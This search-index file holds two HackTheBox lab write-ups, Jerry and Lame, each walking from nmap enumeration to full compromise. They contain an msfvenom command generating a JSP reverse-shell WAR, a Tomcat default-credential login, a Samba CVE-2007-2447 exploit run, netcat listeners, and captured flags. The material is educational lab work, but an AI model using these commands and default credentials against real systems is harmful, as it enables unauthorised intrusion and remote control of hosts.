<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[Jerry Machine Writeup- HackTheBox]]></title>
      <url>/2020/12/03/HTB_Jerry_Writeup/</url>
      <content type="text"><![CDATA[Methodology  Open Ports Enumeration  Web Service Enumeration  Default credentials identified  Reverse shell deployed as ‘war’ package  Foothold gained as SYSTEM userLessons Learned  Identifying Apache Tomcat default credentials  Deploying reverse shell as war packageOpen Ports EnumerationThe open ports enumeration through targetRecon1, had identified only one open port, web service, HTTP (8080). The scan had not identified any known vulnerabilities through vulnerability scan. The results of the scan are given below.~/HTB/Tracks/Beginner/Jerry/ targetRecon 10.10.10.95[+] Open Ports ScanHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.		8080    http-proxy[+] Scripts Scan				 nmap -sV -A --script=default,vuln -p 8080 10.10.10.95Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-03 15:35 ISTNmap scan report for 10.10.10.95 (10.10.10.95)Host is up (0.22s latency).PORT     STATE SERVICE VERSION8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1|_http-csrf: Couldn't find any CSRF vulnerabilities.|_http-dombased-xss: Couldn't find any DOM based XSS.| http-enum: |   /examples/: Sample scripts|   /manager/html/upload: Apache Tomcat (401 Unauthorized)|   /manager/html: Apache Tomcat (401 Unauthorized)|_  /docs/: Potentially interesting folder|_http-favicon: Apache Tomcat|_http-server-header: Apache-Coyote/1.1| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server's resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.|_http-title: Apache Tomcat/7.0.88Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 563.19 seconds[+] Summary 8080    http-proxy      Apache Tomcat/Coyote JSP engine 1.1				No vuln foundWeb Service EnumerationBrowsing to http://10.10.10.95:8080 revealed an Apache Tomcat installation, with a link to Manager App. The error page, received after attempting multiple wrong credentials revealed the default credentials tomcat:s3cret. The same is shown on the image given below.FootholdUsing the default credentials gave access to the Admin Panel of Apache Tomcat installation. A reverse shell, as awar package was then generated using msfvenom as shown on the following command.msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9095 -f war &gt; revShell.warThe war package was then uploaded through the admin panel. A netcat listener on port 9095 was initiated, and the reverse shell was triggered by visiting http://10.10.10.95:8080/revShell/. This resulted in a shell, as a SYSTEM user being caught on the listener. The same is shown on the section given below.b4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc -nvlp 9095                                                                           Connection from 10.10.10.95:49192Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\apache-tomcat-7.0.88&gt;whoamiwhoamint authority\systemb4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc -nvlp 9095Connection from 10.10.10.95:49195Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\apache-tomcat-7.0.88&gt;cd C:\Users\Administrator\Desktop\flagscd C:\Users\Administrator\Desktop\flagsC:\Users\Administrator\Desktop\flags&gt;type "2 for the price of 1.txt"type "2 for the price of 1.txt"user.txt7004dbcef0f854e0fb401875f26ebd00root.txt04a8b36e1545a455393d067e772fe90eSystem OwnedResources            targetRecon &#8617;      ]]></content>
      <categories>
        
          <category> HTB </category>
        
          <category> Writeup </category>
        
          <category> Machine </category>
        
      </categories>
      <tags>
        
          <tag> Windows </tag>
        
          <tag> Apache Tomcat </tag>
        
          <tag> war deployment </tag>
        
          <tag> without metasploit </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Lame Machine Writeup- HackTheBox]]></title>
      <url>/2020/12/02/HTB_Lame_Writeup/</url>
      <content type="text"><![CDATA[Methodology  Open Ports Enumeration  Samba version identified  RCE for Samba version identified  Foothold gained as root userLessons Learned  Public Exploit IdentificationOpen Ports EnumerationThe open ports enumeration through targetRecon1 had identified four open ports namely FTP (21), SSH (22),NETBIOS-SSN (139) and MICROSOFT-DS (445). The scan had not identified any known vulnerabilities through vulnerability scan. The results of the scan are given below.b4bygroot@arcolinux:~/HTB/Tracks/Beginner_Track/Lame|⇒  targetRecon 10.10.10.3[+] Open Ports ScanHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.		21      ftp		22      ssh		139     netbios-ssn		445     microsoft-ds[+] Scripts Scan				 nmap -sV -A --script=default,vuln -p 21 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 ISTNmap scan report for 10.10.10.3 (10.10.10.3)Host is up (0.20s latency).PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |   STAT: | FTP server status:|      Connected to 10.10.14.3|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      vsFTPd 2.3.4 - secure, fast, stable|_End of status|_sslv2-drown: Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds				 nmap -sV -A --script=default,vuln -p 22 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 ISTNmap scan report for 10.10.10.3 (10.10.10.3)Host is up (0.22s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)| vulners: |   cpe:/a:openbsd:openssh:4.7p1: |       PACKETSTORM:101052      7.8     https://vulners.com/packetstorm/PACKETSTORM:101052      *EXPLOIT*|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds				 nmap -sV -A --script=default,vuln -p 139 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:39 ISTNmap scan report for 10.10.10.3 (10.10.10.3)Host is up (0.20s latency).PORT    STATE SERVICE     VERSION139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)Host script results:|_clock-skew: mean: 2h39m33s, deviation: 3h33m46s, median: 8m23s| smb-os-discovery: |   OS: Unix (Samba 3.0.20-Debian)|   Computer name: lame|   NetBIOS computer name: |   Domain name: hackthebox.gr|   FQDN: lame.hackthebox.gr|_  System time: 2020-12-02T03:20:12-05:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: false|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 425.45 seconds				 nmap -sV -A --script=default,vuln -p 445 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:46 ISTNmap scan report for 10.10.10.3 (10.10.10.3)Host is up (0.20s latency).PORT    STATE SERVICE     VERSION445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)Host script results:|_clock-skew: mean: 2h38m28s, deviation: 3h32m14s, median: 8m23s| smb-os-discovery: |   OS: Unix (Samba 3.0.20-Debian)|   Computer name: lame|   NetBIOS computer name: |   Domain name: hackthebox.gr|   FQDN: lame.hackthebox.gr|_  System time: 2020-12-02T03:25:02-05:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: false|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 172.54 seconds[+] Summary 21      ftp     vsftpd 2.3.4				No vuln found22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1				No vuln found139     netbios-ssn     Samba smbd 3.0.20-Debian				No vuln found445     microsoft-ds    Samba smbd 3.0.20-Debian				No vuln foundSamba Service EnumerationThrough the scan result from the previous section the Samba service version of the target was identified as 3.0.20. Google-Fu with the version had identified a known vulnerability through CVE-2007-2447. Thoughmetasploit module is available for the vulnerability, further googling had identified a working python exploit on GitHubby amriunix2.FootholdBefore executing the exploit, the required package pysmb needed to be installed through pip. A netcat listener, listening on port 9095 was initiated after which the exploit script was executed as follows.[b4bygroot@arcolinux Lame ]$ python usermapScript.py 10.10.10.3 445 10.10.14.3 9095[*] CVE-2007-2447 - Samba usermap script[+] Connecting ![+] Payload was sent - check netcat !This resulted in a reverse shell on the netcat listener. Enumerating further had showed that the shell received was fromthe root user, eliminating the need for privilege escalation. The same is shown on the section below.➜  Lame  nc -nvlp 9095                                         Connection from 10.10.10.3:52271python -c "import pty;pty.spawn('/bin/bash')"root@lame:/# ididuid=0(root) gid=0(root)root@lame:/# cat /root/root.txtcat /root/root.txt0a4e1bf944cdc7df8c2f1eb56bf8030droot@lame:/# cat /home/makis/user.txtcat /home/makis/user.txta392eccf53d48a4abf840247bd155f80root@lame:/# System OwnedResources            targetRecon &#8617;              CVE-2007-2447 Samba usermap script &#8617;      ]]></content>
      <categories>
        
          <category> HTB </category>
        
          <category> Writeup </category>
        
          <category> Machine </category>
        
      </categories>
      <tags>
        
          <tag> linux </tag>
        
          <tag> samba </tag>
        
          <tag> CVE-2007-2447 </tag>
        
          <tag> without metasploit </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
